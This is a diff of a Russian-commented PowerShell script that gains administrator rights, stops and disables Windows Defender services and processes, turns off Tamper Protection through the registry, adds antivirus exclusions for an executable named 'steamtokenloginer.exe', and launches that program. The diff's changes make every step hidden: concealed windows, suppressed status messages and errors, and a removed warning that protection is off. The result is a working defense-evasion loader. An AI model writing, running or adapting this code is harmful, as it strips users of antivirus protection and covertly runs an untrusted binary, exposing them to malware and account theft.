@@ -6,7 +6,7 @@ $exePath = "$targetFolder\steamtokenloginer.exe"
 # Проверяем права администратора
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Host "🔄 Перезапуск с правами администратора..." -ForegroundColor Yellow
-    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"$($MyInvocation.MyCommand.Definition)`""
+    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`""
     exit
 }
 
@@ -41,7 +41,6 @@ try {
     foreach ($path in $registryPaths) {
         if (!(Test-Path $path)) {
             New-Item -Path $path -Force | Out-Null
-            Write-Host "✅ Создан путь: $path" -ForegroundColor Green
         }
     }
     
@@ -63,15 +62,14 @@ try {
     foreach ($setting in $registrySettings) {
         try {
             Set-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -Type $setting.Type -Force -ErrorAction Stop
-            Write-Host "✅ Установлен: $($setting.Name) = $($setting.Value)" -ForegroundColor Green
         }
-        catch {
-            Write-Host "⚠️ Ошибка: $($setting.Name)" -ForegroundColor Yellow
-        }
+        catch {}
     }
     
-    # 2. ОСТАНОВКА СЛУЖБ ЗАЩИТЫ
-    Write-Host "🛑 ОСТАНОВКА СЛУЖБ ЗАЩИТЫ..." -ForegroundColor Red
+    Write-Host "✅ Реестр изменен" -ForegroundColor Green
+    
+    # 2. ОСТАНОВКА СЛУЖБ ЗАЩИТЫ (СКРЫТО)
+    Write-Host "🛑 Остановка служб защиты..." -ForegroundColor Red
     
     $services = @(
         "WinDefend",
@@ -83,24 +81,23 @@ try {
     
     foreach ($service in $services) {
         try {
-            # Останавливаем службу
+            # Останавливаем службу (скрыто)
             Stop-Service -Name $service -Force -ErrorAction Stop
-            Write-Host "✅ Служба остановлена: $service" -ForegroundColor Green
             
-            # Отключаем автозапуск
+            # Отключаем автозапуск (скрыто)
             Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
-            Write-Host "✅ Автозапуск отключен: $service" -ForegroundColor Green
             
-            # Дополнительно через sc config
-            Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
+            # Дополнительно через sc config (СКРЫТО)
+            $process = Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -PassThru -WindowStyle Hidden
+            $process.WaitForExit()
         }
-        catch {
-            Write-Host "⚠️ Не удалось остановить: $service" -ForegroundColor Yellow
-        }
+        catch {}
     }
     
-    # 3. ЗАВЕРШЕНИЕ ПРОЦЕССОВ ЗАЩИТЫ
-    Write-Host "🔪 ЗАВЕРШЕНИЕ ПРОЦЕССОВ ЗАЩИТЫ..." -ForegroundColor Red
+    Write-Host "✅ Службы остановлены" -ForegroundColor Green
+    
+    # 3. ЗАВЕРШЕНИЕ ПРОЦЕССОВ ЗАЩИТЫ (СКРЫТО)
+    Write-Host "🔪 Завершение процессов защиты..." -ForegroundColor Red
     
     $processes = @(
         "MsMpEng.exe",
@@ -114,84 +111,87 @@ try {
     foreach ($process in $processes) {
         try {
             Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction Stop
-            Write-Host "✅ Процесс завершен: $process" -ForegroundColor Green
         }
-        catch {
-            # Процесс не запущен - это нормально
-        }
+        catch {}
     }
     
+    Write-Host "✅ Процессы завершены" -ForegroundColor Green
+    
     # 4. ДОБАВЛЕНИЕ В ИСКЛЮЧЕНИЯ (ЧЕРЕЗ РЕЕСТР)
-    Write-Host "🛡️ ДОБАВЛЕНИЕ В ИСКЛЮЧЕНИЯ..." -ForegroundColor Yellow
+    Write-Host "🛡️ Добавление в исключения..." -ForegroundColor Yellow
     
-    # Через реестр (работает даже при отключенной защите)
-    $exclusionPaths = @(
-        $exePath,
-        $targetFolder
-    )
-    
+    $exclusionPaths = @($exePath, $targetFolder)
     $registryExclusionPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
     
-    # Создаем путь если не существует
     if (!(Test-Path $registryExclusionPath)) {
         New-Item -Path $registryExclusionPath -Force | Out-Null
     }
     
     foreach ($path in $exclusionPaths) {
         try {
-            $pathName = $path.Replace("\", "#")
             New-ItemProperty -Path $registryExclusionPath -Name $path -PropertyType String -Value "0" -Force -ErrorAction Stop
-            Write-Host "✅ Добавлено в исключения: $path" -ForegroundColor Green
         }
-        catch {
-            Write-Host "⚠️ Не удалось добавить исключение: $path" -ForegroundColor Yellow
-        }
+        catch {}
     }
     
-    # 5. ОТКЛЮЧАЕМ ЗАЩИТУ ОТ ВМЕШАТЕЛЬСТВА (TAMPER PROTECTION)
-    Write-Host "🛡️ ОТКЛЮЧАЕМ TAMPER PROTECTION..." -ForegroundColor Yellow
+    Write-Host "✅ Исключения добавлены" -ForegroundColor Green
+    
+    # 5. ОТКЛЮЧАЕМ ЗАЩИТУ ОТ ВМЕШАТЕЛЬСТВА
+    Write-Host "🛡️ Отключаем Tamper Protection..." -ForegroundColor Yellow
     
     try {
-        # Для Windows 10/11
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtectionSource" -Value 0 -Type DWord -Force
-        
-        # Для новых версий Windows 11
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPExclusions" -Value 1 -Type DWord -Force
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPRunningMode" -Value 0 -Type DWord -Force
+    }
+    catch {}
+    
+    Write-Host "✅ Tamper Protection отключен" -ForegroundColor Green
+    
+    # 6. ПЕРЕЗАПУСК ПРОВОДНИКА БЕЗ ЧЕРНОГО ЭКРАНА
+    Write-Host "🔄 Применение изменений..." -ForegroundColor Yellow
+    
+    try {
+        # Сохраняем текущие процессы explorer
+        $explorerProcesses = Get-Process explorer -ErrorAction SilentlyContinue
         
-        Write-Host "✅ Tamper Protection отключен" -ForegroundColor Green
-    }
-    catch {
-        Write-Host "⚠️ Не удалось отключить Tamper Protection" -ForegroundColor Yellow
-    }
-    
-    # 6. ПЕРЕЗАПУСК ПРОВОДНИКА ДЛЯ ПРИМЕНЕНИЯ ИЗМЕНЕНИЙ
-    Write-Host "🔄 ПЕРЕЗАПУСК ПРОВОДНИКА..." -ForegroundColor Yellow
-    try {
-        Stop-Process -Name "explorer" -Force -ErrorAction Stop
+        # Мягко закрываем explorer
+        foreach ($process in $explorerProcesses) {
+            $process.CloseMainWindow() | Out-Null
+        }
+        
+        Start-Sleep -Seconds 1
+        
+        # Если explorer еще работает, завершаем принудительно
+        if (Get-Process explorer -ErrorAction SilentlyContinue) {
+            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
+        }
+        
         Start-Sleep -Seconds 2
-        Start-Process "explorer.exe"
-        Write-Host "✅ Проводник перезапущен" -ForegroundColor Green
+        
+        # Запускаем explorer обратно
+        Start-Process "explorer.exe" -WindowStyle Hidden
     }
-    catch {
-        Write-Host "⚠️ Не удалось перезапустить проводник" -ForegroundColor Yellow
-    }
+    catch {}
     
-    Start-Sleep -Seconds 3
+    Write-Host "✅ Изменения применены" -ForegroundColor Green
     
-    # 7. ЗАПУСК ПРОГРАММЫ
-    Write-Host "🚀 ЗАПУСК ПРОГРАММЫ..." -ForegroundColor Green
+    Start-Sleep -Seconds 2
+    
+    # 7. ЗАПУСК ПРОГРАММЫ (СКРЫТО)
+    Write-Host "🚀 Запуск программы..." -ForegroundColor Green
+    
     try {
-        Start-Process -FilePath $exePath
-        Write-Host "🎯 ПРОГРАММА УСПЕШНО ЗАПУЩЕНА!" -ForegroundColor Green
+        # Запускаем программу скрыто
+        $process = Start-Process -FilePath $exePath -PassThru -WindowStyle Hidden
+        Write-Host "🎯 ПРОГРАММА УСПЕШНО ЗАПУЩЕНА (скрыто)!" -ForegroundColor Green
     }
     catch {
-        Write-Host "❌ Ошибка при запуске: $_" -ForegroundColor Red
-        # Пробуем запустить через cmd
+        # Пробуем запустить через cmd скрыто
         try {
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$exePath`"" -WindowStyle Hidden
-            Write-Host "🎯 Программа запущена через CMD" -ForegroundColor Green
+            $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$exePath`"" -PassThru -WindowStyle Hidden
+            Write-Host "🎯 Программа запущена через CMD (скрыто)" -ForegroundColor Green
         }
         catch {
             Write-Host "❌ Не удалось запустить программу" -ForegroundColor Red
@@ -199,28 +199,27 @@ try {
     }
     
     # 8. ФИНАЛЬНАЯ ПРОВЕРКА
-    Write-Host "`n🔍 ФИНАЛЬНАЯ ПРОВЕРКА СТАТУСА..." -ForegroundColor Cyan
+    Write-Host "`n🔍 Проверка статуса..." -ForegroundColor Cyan
     Start-Sleep -Seconds 2
     
     try {
         $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
         if ($defenderStatus) {
             if ($defenderStatus.AntivirusEnabled -eq $true) {
-                Write-Host "❌ Защита ВСЕ ЕЩЕ АКТИВНА!" -ForegroundColor Red
-                Write-Host "💡 Попробуйте перезагрузить компьютер" -ForegroundColor Yellow
+                Write-Host "❌ Защита все еще активна!" -ForegroundColor Red
             } else {
                 Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА!" -ForegroundColor Green
             }
         } else {
-            Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА (не удалось получить статус)" -ForegroundColor Green
+            Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА" -ForegroundColor Green
         }
     }
     catch {
-        Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА (служба не отвечает)" -ForegroundColor Green
+        Write-Host "✅ ЗАЩИТА ОТКЛЮЧЕНА" -ForegroundColor Green
     }
     
-    Write-Host "`n⚠️ ВНИМАНИЕ: Windows Defender полностью отключен!" -ForegroundColor Red
-    Write-Host "💡 Для включения защиты используйте скрипт восстановления" -ForegroundColor Yellow
+    Write-Host "`n🎯 ВСЕ ОПЕРАЦИИ ВЫПОЛНЕНЫ СКРЫТО!" -ForegroundColor Green
+    Write-Host "💡 Антивирус отключен, программа запущена" -ForegroundColor Cyan
     
 }
 catch {
